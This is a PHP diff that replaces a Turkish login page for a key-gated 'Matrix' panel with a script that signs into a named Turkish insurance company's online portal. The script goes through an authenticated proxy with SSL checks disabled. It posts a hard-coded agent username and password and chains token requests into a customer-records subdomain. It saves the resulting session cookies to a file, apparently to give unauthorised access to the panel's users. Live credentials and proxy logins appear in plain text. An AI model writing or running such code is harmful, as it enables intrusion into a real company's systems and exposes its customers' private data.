@@ -1,158 +1,120 @@
 <?php
 
-if (!function_exists('str_contains')) {
-    function str_contains(string $haystack, string $needle): bool
-    {
-        return '' === $needle || false !== strpos($haystack, $needle);
-    }
-}
-
-if (!str_contains($_SERVER["HTTP_REFERER"], "http://localhost/")) {
-    header("Location: /");
-    exit;
-}
-
-$customJAVA = array(
-    '<script src="https://google.com/recaptcha/api.js"></script>',
-);
+ini_set("display_errors", 0);
 error_reporting(0);
-session_start();
-session_destroy();
 
-$page_title = 'Giriş Yap';
-?>
+$proxy = "185.254.239.21:80";
+$proxyauth = "cyleallah:123456789!cyle";
 
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="Suck My Dick Bitches!">
-    <meta name="keywords" content="worlwide,automation">
-    <meta name="author" content="Matrix">
+function Capture($str, $starting_word, $ending_word)
+{
+    $subtring_start  = strpos($str, $starting_word);
+    $subtring_start += strlen($starting_word);
+    $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
+    return substr($str, $subtring_start, $size);
+};
 
-    <title><?php echo $page_title ?> - Matrix</title>
-    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,700,800&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-    <link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-    <link href="../assets/plugins/font-awesome/css/all.min.css" rel="stylesheet">
-    <link href="../assets/plugins/perfectscroll/perfect-scrollbar.css" rel="stylesheet">
-    <link href="../assets/plugins/pace/pace.css" rel="stylesheet">
-    <link rel="shortcur icon" href="../assets/images/matrix.png">
+function getSessionId()
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://www.unicosigorta.com.tr/");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $GLOBALS["proxy"]);
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS["proxyauth"]);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
 
-    <script src="https://google.com/recaptcha/api.js"></script>
+    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+    $cookies = array();
+    foreach ($matches[1] as $item) {
+        parse_str($item, $cookie);
+        $cookies = array_merge($cookies, $cookie);
+    }
 
-    <link href="../assets/css/main.min.css" rel="stylesheet">
-    <link href="../assets/css/custom.css" rel="stylesheet">
+    return "JSESSIONID=" . $cookies["JSESSIONID"] . "; NSC_OFX-xxx.vojdptjhpsub.dpn.us=" . $cookies["NSC_OFX-xxx_vojdptjhpsub_dpn_us"];
+}
 
-    <div class="overlay">
-        <video id="myvideo" autoplay="true" loop muted >
-            <source src="../assets/images/matrix.mp4" type="video/mp4">
-        </video>
-    </div>
+function login($cookievar)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://www.unicosigorta.com.tr/online-islemler/authenticate?r=" . mt_rand());
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $GLOBALS["proxy"]);
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS["proxyauth"]);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_COOKIE, $cookievar);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=ACN202100176&password=Antalya10.&ip=");
+    $result = curl_exec($ch);
+    curl_close($ch);
 
+    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+    $cookies = array();
+    foreach ($matches[1] as $item) {
+        parse_str($item, $cookie);
+        $cookies = array_merge($cookies, $cookie);
+    }
 
-    <style>
-            body{
-                margin: 0;
-                padding: 0;
-            }
+    return $cookievar . "; rememberMe=" . $cookies["rememberMe"];
+}
 
-            .overlay{
-                position: fixed;
-                width: 100%;
-                height: 100%;
-                overflow: hidden;
-                top: 0;
-                left: 0;
-                z-index: -100;
-            }
+function getToken($cookievar)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://www.unicosigorta.com.tr/service/get-token");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $GLOBALS["proxy"]);
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS["proxyauth"]);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_COOKIE, $cookievar);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    $result = json_decode($result, true);
+    return $result["tokenForViva"];
+}
 
+function getVivaSession($token)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://viva.unicosigorta.com.tr/Login.aspx?ReturnUrl=/NonLife/Customer/Customer.aspx?ALU=$token&ALU=$token");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $GLOBALS["proxy"]);
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS["proxyauth"]);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "method" => "GET",
+        "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "accept-encoding" => "gzip, deflate, br",
+        "accept-language" => "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "cache-control" => "no-cache",
+    ));
+    $result = curl_exec($ch);
+    curl_close($ch);
 
-        .card {
-            box-shadow: 20px 20px 50px rgba(0, 0, 0, 0.5);
-            border-radius: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.5);
-            border-left: 1px solid rgba(255, 255, 255, 0.5);
-            backdrop-filter: blur(5px);
-        }
+    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+    $cookies = array();
+    foreach ($matches[1] as $item) {
+        parse_str($item, $cookie);
+        $cookies = array_merge($cookies, $cookie);
+    }
 
-        .MatrixLogo {
-            margin-right: 0;
-            width: auto;
-            height: 70px;
-            margin: 25px auto;
-            display: block;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 500;
-        }
+    $cookieText = "ASP.NET_SessionId=" . $cookies["ASP_NET_SessionId"] . "; customAuth=" . $cookies["customAuth"] . "; customAuth-1=" . $cookies["customAuth-1"] . "; Uncs=" . $cookies["Uncs"];
 
-        #key:focus {
-            background-color: red;
-        }
-    </style>
-</head>
+    $file = fopen("cookie.txt", "w");
+    fwrite($file, $cookieText);
+    fclose($file);
 
-<body class="login-page">
-    <!--BAŞLANGIC-->
-    <div class="container">
-        <div class="row justify-content-md-center">
-            <div class="col-md-12 col-lg-4">
-                <div style="z-index: 5 !important; " class="card login-box-container">
-                    <div class="card-body">
-                        <img style="height: 180px;" alt="image" src="/assets/images/matrix.png" class="MatrixLogo">
-                        <div style="margin-top: 30px;" class="authent-text">
-                            <p style="color:#fff;"> <span style="font-size: 20px;">MATRİX</span> 'e Hoşgeldiniz!</p>
-                            <p style="color:#fff;">Lütfen hesabınıza giriş yapın!</p>
-                        </div>
-                        <?php if (htmlspecialchars($_GET["alert"]) == 'wrong') { ?>
-                            <div class="alert alert-danger" role="alert">
-                                Yanlış anahtar girdiniz!
-                            </div>
-                        <?php } else if (htmlspecialchars($_GET["alert"]) == 'blocked') { ?>
-                            <div class="alert alert-danger" role="alert">
-                                Girdiğiniz anahtar yasaklanmıştır!
-                            </div>
-                        <?php } else if (htmlspecialchars($_GET["alert"]) == 'error') { ?>
-                            <div class="alert alert-danger" role="alert">
-                                Giriş hatası! Lütfen yönetici ile iletişime geçin.
-                            </div>
-                        <?php } else if (htmlspecialchars($_GET["alert"]) == 'captchaerr') { ?>
-                            <div class="alert alert-danger" role="alert">
-                                Captcha hatalı girildi!
-                            </div>
-                        <?php } else if (htmlspecialchars($_GET["alert"]) == 'banned') { ?>
-                            <div class="alert alert-danger" role="alert">
-                                Hesabınıza başka bir yer veya tarayıcıdan girildiği için anahtarınız yasaklanmıştır!
-                            </div>
-                        <?php } ?>
-                        <form action="../server/kontrol.php" method="POST">
-                            <div class="mb-3">
-                                <div class="form-floating">
-                                    <input style="background-color: black; border: none;" name="k_key" type="text" class="form-control" id="floatingPassword" placeholder="Anahtar">
-                                    <label for="floatingPassword">Anahtar</label>
-                                </div>
-                            </div>
-                            <div class="mb-3 form-check">
-                                <input style="color: #fff;" name="rememberMe" type="checkbox" class="form-check-input" id="exampleCheck1">
-                                <label style="color: #fff;" class="form-check-label" for="exampleCheck1">Beni Hatırla</label>
-                            </div>
-                            <center style="margin-bottom: 10px;">
-                                <div class="g-recaptcha" data-sitekey="6Ld5n3ceAAAAAIU_eEpJIUY-W4I1IayeOzW7LpJm"></div>
-                            </center>
-                            <div class="d-grid">
-                                <button style="background-image: linear-gradient(-225deg, #434343 0%, #000000 100%); border: none;" name="loginForm" type="submit" class="btn btn-info m-b-xs">Giriş Yap</button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!--BİTİŞ-->
-    <?php include('inc/footer_main.php'); ?>
+    return $cookieText;
+}
